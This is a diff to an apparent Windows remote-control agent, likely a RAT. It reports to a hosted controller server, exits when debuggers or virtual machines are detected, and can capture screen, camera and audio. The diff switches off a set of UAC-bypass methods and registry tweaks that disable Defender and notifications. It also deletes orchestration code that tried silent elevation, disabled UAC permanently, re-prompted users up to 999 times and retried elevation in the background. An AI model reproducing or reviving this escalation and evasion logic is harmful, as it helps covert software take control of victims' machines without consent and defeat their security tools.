@@ -226,13 +226,12 @@ RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = False  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
-# ✅ NEW ETHICAL SETTINGS
-REQUEST_ADMIN_FIRST = False
+ 
 DISABLE_UAC_BYPASS = True
 UAC_BYPASS_ALLOWED = False
 MAX_PROMPT_ATTEMPTS = None     # Limit prompts to 3 attempts instead of 999
-BYPASSES_ENABLED = True
-REGISTRY_ENABLED = True
+BYPASSES_ENABLED = False
+REGISTRY_ENABLED = False
 PERSISTENT_ADMIN_PROMPT_ENABLED = False
 
 # Controller URL override flag (set URL via env)
@@ -240,37 +239,38 @@ USE_FIXED_SERVER_URL = True
 FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com/dashboard')
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000/')
-DISABLE_SLUI_BYPASS = False
-UAC_BYPASS_DEBUG_MODE = True
+DISABLE_SLUI_BYPASS = True
+UAC_BYPASS_DEBUG_MODE = False
 UAC_BYPASS_METHODS_ENABLED = {
-    'cleanmgr_sagerun': True,
-    'fodhelper': True,
-    'computerdefaults': True,
-    'eventvwr': True,
-    'sdclt': True,
-    'wsreset': True,
-    'slui': True,
-    'winsat': True,
-    'silentcleanup': True,
-    'icmluautil': True
+    'cleanmgr_sagerun': False,
+    'fodhelper': False,
+    'computerdefaults': False,
+    'eventvwr': False,
+    'sdclt': False,
+    'wsreset': False,
+    'slui': False,
+    'winsat': False,
+    'silentcleanup': False,
+    'icmluautil': False,
+    'runas_prompt': False
 }
 REGISTRY_ACTIONS = {
-    'policy_push_notifications': True,
-    'policy_windows_update': True,
-    'context_runas_cmd': True,
-    'context_powershell_admin': True,
-    'notify_center_hkcu': True,
-    'notify_center_hklm': True,
-    'defender_ux_suppress': True,
-    'toast_global_above_lock': True,
-    'toast_global_critical_above_lock': True,
-    'toast_windows_update': True,
-    'toast_security_maintenance': True,
-    'toast_windows_security': True,
-    'toast_sec_health_ui': True,
-    'explorer_balloon_tips': True,
-    'explorer_info_tip': True,
-    'disableRealtimeMonitoring': True
+    'policy_push_notifications': False,
+    'policy_windows_update': False,
+    'context_runas_cmd': False,
+    'context_powershell_admin': False,
+    'notify_center_hkcu': False,
+    'notify_center_hklm': False,
+    'defender_ux_suppress': False,
+    'toast_global_above_lock': False,
+    'toast_global_critical_above_lock': False,
+    'toast_windows_update': False,
+    'toast_security_maintenance': False,
+    'toast_windows_security': False,
+    'toast_sec_health_ui': False,
+    'explorer_balloon_tips': False,
+    'explorer_info_tip': False,
+    'disableRealtimeMonitoring': False
 }
 
 AGENT_ID_SAVE_WARNED = False
@@ -799,8 +799,8 @@ SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else os.environ.get('CONTR
 
 # Email notification configuration (use Gmail App Password)
 EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
-DEFENDER_DISABLE_ENABLED = os.environ.get('ENABLE_DEFENDER_DISABLE', '0') == '1'
-DEFENDER_TAMPER_DISABLE_ENABLED = os.environ.get('ENABLE_DEFENDER_TAMPER_DISABLE', '0') == '1'
+DEFENDER_DISABLE_ENABLED = False
+DEFENDER_TAMPER_DISABLE_ENABLED = False
 AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '0') == '1'
 AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '0') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
@@ -1414,129 +1414,12 @@ class BackgroundInitializer:
             
             if WINDOWS_AVAILABLE:
                 debug_print("[PRIVILEGE ESCALATION] Windows detected - checking admin status...")
-                
-                if not is_admin():
-                    debug_print("=" * 80)
-                    debug_print("❌ [PRIVILEGE ESCALATION] NOT ADMIN - NEED ELEVATION")
-                    debug_print("=" * 80)
-                    log_message("🔒 Not running as admin - requesting permission...")
-                    
-                    # ✅ NEW ETHICAL FLOW: Request permission FIRST
-                    if REQUEST_ADMIN_FIRST:
-                        debug_print("=" * 80)
-                        debug_print("✅ [ETHICAL MODE] Requesting admin permission FIRST")
-                        debug_print("✅ [ETHICAL MODE] Will show UAC prompt and ask for your approval")
-                        debug_print("=" * 80)
-                        log_message("✅ Requesting admin permission properly (no bypass attempts)...")
-                        
-                        # Show proper UAC prompt with limited attempts
-                        if run_as_admin_with_limited_attempts():
-                            debug_print("✅ [ADMIN REQUEST] User granted admin privileges!")
-                            log_message("✅ Admin privileges granted by user!")
-                            return "admin_granted"
-                        else:
-                            debug_print("❌ [ADMIN REQUEST] User denied admin privileges")
-                            log_message("❌ Admin privileges denied - continuing without admin")
-                            return "admin_denied"
-                    
-                    # ❌ OLD MALICIOUS FLOW (only if bypass not disabled)
-                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
-                        if run_as_admin_persistent():
-                            return "persistent_uac_success"
-                        else:
-                            pass
-                    if not DISABLE_UAC_BYPASS:
-                        # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
-                        debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
-                        log_message("📋 Attempting UAC bypass methods...")
-                        
-                        debug_print("[UAC] Calling attempt_uac_bypass()...")
-                        uac_result = attempt_uac_bypass()
-                        
-                        if uac_result:
-                            debug_print("=" * 80)
-                            debug_print("✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
-                            debug_print("=" * 80)
-                            log_message("✅ UAC bypass successful! Now running with admin privileges!")
-                            
-                            # After successful bypass, disable UAC permanently
-                            debug_print("[UAC] Disabling UAC permanently...")
-                            if disable_uac():
-                                debug_print("✅ [UAC] UAC disabled successfully!")
-                                log_message("✅ UAC permanently disabled!")
-                            else:
-                                debug_print("❌ [UAC] UAC disable FAILED!")
-                            try:
-                                perform_post_admin_actions()
-                            except Exception:
-                                pass
-                            return "uac_bypass_success"
-                        else:
-                            debug_print("=" * 80)
-                            debug_print("❌ [UAC BYPASS] FAILED - All methods failed")
-                            debug_print("=" * 80)
-                        
-                        # STEP 2: If UAC bypass fails, try registry-based auto-elevation
-                        debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
-                        log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
-                        if REGISTRY_ENABLED and elevate_via_registry_auto_approve():
-                            debug_print("✅ [REGISTRY] Auto-elevation successful!")
-                            log_message("✅ Registry auto-elevation successful!")
-                            return "registry_elevation_success"
-                        else:
-                            debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
-                        
-                        # STEP 3: Persistent UAC prompt - keep asking until user clicks YES
-                        debug_print("[PRIVILEGE ESCALATION] STEP 3: Persistent UAC prompt loop")
-                        log_message("🔄 Showing persistent UAC prompt - will keep asking until you click YES...")
-                        
-                        # This will loop showing UAC prompts until user clicks YES or 999 attempts
-                        if run_as_admin_persistent():
-                            debug_print("✅ [PERSISTENT UAC] User granted admin!")
-                            log_message("✅ Persistent UAC prompt successful!")
-                            return "persistent_uac_success"
-                        else:
-                            debug_print("❌ [PERSISTENT UAC] Max attempts reached or failed")
-                        
-                        # STEP 4: If all else fails, continue without admin but keep trying in background
-                        debug_print("[PRIVILEGE ESCALATION] STEP 4: Background retry thread")
-                        log_message("⚠️ All elevation methods failed, will retry in background...")
-                        # Start a background thread to keep retrying UAC bypass
-                        threading.Thread(target=keep_trying_elevation, daemon=True).start()
-                        debug_print("⚠️ [PRIVILEGE ESCALATION] Continuing WITHOUT admin (background retry active)")
-                        return "elevation_pending"
-                    else:
-                        debug_print("✅ [BYPASS DISABLED] UAC bypass methods are DISABLED")
-                        log_message("✅ UAC bypass disabled - continuing without admin")
-                        return "bypass_disabled"
-                
                 if is_admin():
-                    debug_print("=" * 80)
-                    debug_print("✅ [PRIVILEGE ESCALATION] ALREADY ADMIN!")
-                    debug_print("=" * 80)
-                    log_message("✅ Already running as admin!")
-                    
-                    # Immediately disable UAC to prevent future prompts
-                    debug_print("[UAC] Disabling UAC permanently...")
-                    log_message("🔧 Disabling UAC permanently...")
-                    if disable_uac():
-                        debug_print("✅ [UAC] UAC disabled successfully!")
-                        log_message("✅ UAC permanently disabled - no more prompts!")
-                        try:
-                            perform_post_admin_actions()
-                        except Exception:
-                            pass
-                        return "uac_disabled"
-                    else:
-                        debug_print("❌ [UAC] UAC disable FAILED (needs HKLM write access)")
-                        log_message("⚠️ UAC disable failed (needs HKLM write access)")
-                        try:
-                            perform_post_admin_actions()
-                        except Exception:
-                            pass
-                        return "uac_disable_failed"
-            
-            debug_print("[PRIVILEGE ESCALATION] Not Windows - no elevation needed")
+                    log_message("Already running as admin (no elevation actions taken)")
+                    return "already_admin"
+                log_message("Running as standard user (elevation disabled)")
+                return "standard_user"
+
             return "no_elevation_needed"
         except Exception as e:
             debug_print(f"❌ [PRIVILEGE ESCALATION] EXCEPTION: {e}")
@@ -10121,113 +10004,22 @@ def on_config_update(data):
         agent = data.get('agent') or {}
         bypasses = data.get('bypasses') or {}
         registry = data.get('registry') or {}
-        global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
-        prev_disable_uac_bypass = DISABLE_UAC_BYPASS if 'DISABLE_UAC_BYPASS' in globals() else None
-        prev_persistent_prompt = PERSISTENT_ADMIN_PROMPT_ENABLED if 'PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() else None
-        prev_registry_enabled = REGISTRY_ENABLED if 'REGISTRY_ENABLED' in globals() else None
-        prev_slui_disabled = DISABLE_SLUI_BYPASS if 'DISABLE_SLUI_BYPASS' in globals() else None
-        prev_methods = dict(UAC_BYPASS_METHODS_ENABLED) if 'UAC_BYPASS_METHODS_ENABLED' in globals() else {}
-        REQUEST_ADMIN_FIRST = bool(agent.get('requestAdminFirst', REQUEST_ADMIN_FIRST))
+        global MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
+        MAX_PROMPT_ATTEMPTS = None
+        UAC_BYPASS_DEBUG_MODE = False
+        PERSISTENT_ADMIN_PROMPT_ENABLED = False
+        DEFENDER_DISABLE_ENABLED = False
+        REGISTRY_ENABLED = False
+        DISABLE_UAC_BYPASS = True
+        DISABLE_SLUI_BYPASS = True
         try:
-            MAX_PROMPT_ATTEMPTS = int(agent.get('maxPromptAttempts', MAX_PROMPT_ATTEMPTS))
-        except Exception:
-            pass
-        UAC_BYPASS_DEBUG_MODE = bool(agent.get('uacBypassDebug', UAC_BYPASS_DEBUG_MODE))
-        PERSISTENT_ADMIN_PROMPT_ENABLED = bool(agent.get('persistentAdminPrompt', PERSISTENT_ADMIN_PROMPT_ENABLED))
-        DEFENDER_DISABLE_ENABLED = bool(agent.get('enableDefenderDisable', DEFENDER_DISABLE_ENABLED))
-        bypasses_enabled = bool(bypasses.get('enabled', True))
-        REGISTRY_ENABLED = bool(registry.get('enabled', True))
-        DISABLE_UAC_BYPASS = (not bool(agent.get('enableUACBypass', True))) or (not bypasses_enabled) or (not UAC_BYPASS_ALLOWED)
-        methods = bypasses.get('methods') or {}
-        for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
-            if k in methods:
-                UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k))
-        if 'slui' in methods:
-            DISABLE_SLUI_BYPASS = not bool(methods.get('slui'))
-        actions = registry.get('actions') or {}
-        try:
-            for k, v in actions.items():
-                REGISTRY_ACTIONS[k] = bool(v)
+            for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
+                UAC_BYPASS_METHODS_ENABLED[k] = False
         except Exception:
             pass
         try:
-            uac_state_changed = prev_disable_uac_bypass is not None and prev_disable_uac_bypass != DISABLE_UAC_BYPASS
-            if uac_state_changed:
-                if not DISABLE_UAC_BYPASS and bypasses_enabled:
-                    emit_security_notification('info', 'UAC Bypass Enabled', 'UAC bypass features enabled')
-                else:
-                    emit_security_notification('warning', 'UAC Bypass Disabled', 'UAC bypass features disabled')
-            persistent_changed = prev_persistent_prompt is not None and prev_persistent_prompt != PERSISTENT_ADMIN_PROMPT_ENABLED
-            if persistent_changed:
-                if PERSISTENT_ADMIN_PROMPT_ENABLED:
-                    emit_security_notification('info', 'Persistent Admin Prompt Enabled', 'Will ask for admin repeatedly')
-                else:
-                    emit_security_notification('info', 'Persistent Admin Prompt Disabled', 'Stopped persistent admin prompts')
-            registry_changed = prev_registry_enabled is not None and prev_registry_enabled != REGISTRY_ENABLED
-            if registry_changed:
-                if REGISTRY_ENABLED:
-                    emit_security_notification('info', 'Registry Controls Enabled', 'Registry action toggles active')
-                else:
-                    emit_security_notification('warning', 'Registry Controls Disabled', 'Registry action toggles inactive')
-            slui_changed = prev_slui_disabled is not None and prev_slui_disabled != DISABLE_SLUI_BYPASS
-            if slui_changed:
-                if not DISABLE_SLUI_BYPASS:
-                    emit_security_notification('info', 'SLUI Bypass Enabled', 'slui method enabled')
-                else:
-                    emit_security_notification('warning', 'SLUI Bypass Disabled', 'slui method disabled')
-            method_names = {
-                'cleanmgr_sagerun': 'cleanmgr/sagerun',
-                'fodhelper': 'fodhelper',
-                'computerdefaults': 'computerdefaults',
-                'eventvwr': 'eventvwr',
-                'sdclt': 'sdclt',
-                'wsreset': 'wsreset',
-                'slui': 'slui',
-                'winsat': 'winsat',
-                'silentcleanup': 'SilentCleanup',
-                'icmluautil': 'ICMLuaUtil'
-            }
-            for mk, prev_val in (prev_methods or {}).items():
-                if mk in UAC_BYPASS_METHODS_ENABLED:
-                    curr = UAC_BYPASS_METHODS_ENABLED[mk]
-                    if curr != prev_val:
-                        name = method_names.get(mk, mk)
-                        if curr:
-                            emit_security_notification('info', 'UAC Method Enabled', name)
-                        else:
-                            emit_security_notification('warning', 'UAC Method Disabled', name)
-        except Exception:
-            pass
-        try:
-            def _apply_changes():
-                try:
-                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
-                        try:
-                            r = run_as_admin_persistent()
-                            if r:
-                                emit_security_notification('success', 'Admin Granted', 'Persistent UAC prompt granted admin')
-                            else:
-                                emit_security_notification('info', 'Admin Prompt Active', 'Persistent UAC prompt running')
-                        except Exception:
-                            pass
-                    if not DISABLE_UAC_BYPASS and bypasses_enabled:
-                        try:
-                            attempt_uac_bypass()
-                        except Exception:
-                            pass
-                    if REGISTRY_ENABLED and actions:
-                        for k, v in actions.items():
-                            try:
-                                res = apply_registry_action(k, bool(v))
-                                if res:
-                                    emit_security_notification('success', 'Registry Action Applied', f'{k} set to {bool(v)}')
-                                else:
-                                    emit_security_notification('error', 'Registry Action Failed', f'{k} set to {bool(v)} failed')
-                            except Exception:
-                                pass
-                except Exception:
-                    pass
-            threading.Thread(target=_apply_changes, daemon=True).start()
+            for k in list(REGISTRY_ACTIONS.keys()):
+                REGISTRY_ACTIONS[k] = False
         except Exception:
             pass
     except Exception:
@@ -15288,8 +15080,9 @@ def on_feature_toggle(data):
             m['connection_quality_metrics'] = enabled
             WEBRTC_CONFIG['monitoring'] = m
         elif feature == 'uac_bypass':
-            UAC_BYPASS_ALLOWED = enabled
-            DISABLE_UAC_BYPASS = not enabled
+            UAC_BYPASS_ALLOWED = False
+            DISABLE_UAC_BYPASS = True
+            enabled = False
         safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
     except Exception as e:
         log_message(f"Feature toggle error: {str(e)}", "error")
@@ -16534,7 +16327,7 @@ if __name__ == "__main__":
     
     # RED TEAM MODE: AGGRESSIVE UAC BYPASS AT STARTUP
     # Use fodhelper.exe to automatically elevate to admin BEFORE Defender can block
-    if WINDOWS_AVAILABLE and not is_admin() and not DISABLE_UAC_BYPASS:
+    if False:
         print("=" * 80)
         print("[RED TEAM] 🚨 AGGRESSIVE UAC BYPASS INITIATED")
         print("[RED TEAM] Using fodhelper.exe to auto-elevate to admin privileges")
@@ -16571,7 +16364,7 @@ if __name__ == "__main__":
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
     
-    # PRIORITY 0: REQUEST ADMIN PRIVILEGES FIRST
+    # PRIORITY 0: Check Administrator Privileges
     if WINDOWS_AVAILABLE:
         print("=" * 80)
         print("[STARTUP] PRIORITY 0: Checking Administrator Privileges...")
@@ -16581,30 +16374,6 @@ if __name__ == "__main__":
             print("[STARTUP] ✅ Already running as Administrator")
         else:
             print("[STARTUP] ⚪ Running as Standard User")
-            print("[STARTUP] 🔄 Attempting to request admin privileges...")
-            
-            if REQUEST_ADMIN_FIRST:
-                if run_as_admin_with_limited_attempts():
-                    print("[STARTUP] ✅ Admin privileges granted")
-                else:
-                    print("[STARTUP] ✅ User declined admin - continuing without admin")
-            else:
-                if not DISABLE_UAC_BYPASS:
-                    print("[STARTUP] 🔄 Using automatic UAC bypass methods...")
-                    if attempt_uac_bypass():
-                        print("[STARTUP] ✅ UAC bypass initiated successfully!")
-                        print("[STARTUP] ⏳ Waiting for elevation to complete...")
-                        time.sleep(3)
-                        if is_admin():
-                            print("[STARTUP] ✅✅✅ SUCCESSFULLY ELEVATED TO ADMIN!")
-                        else:
-                            print("[STARTUP] ⚠️ UAC bypass initiated but not yet elevated")
-                            print("[STARTUP] Continuing with standard user privileges...")
-                    else:
-                        print("[STARTUP] ⚠️ Automatic UAC bypass failed")
-                        print("[STARTUP] Continuing with standard user privileges...")
-                else:
-                    print("[STARTUP] ⚠️ UAC bypass disabled")
         
         print("=" * 80)
     
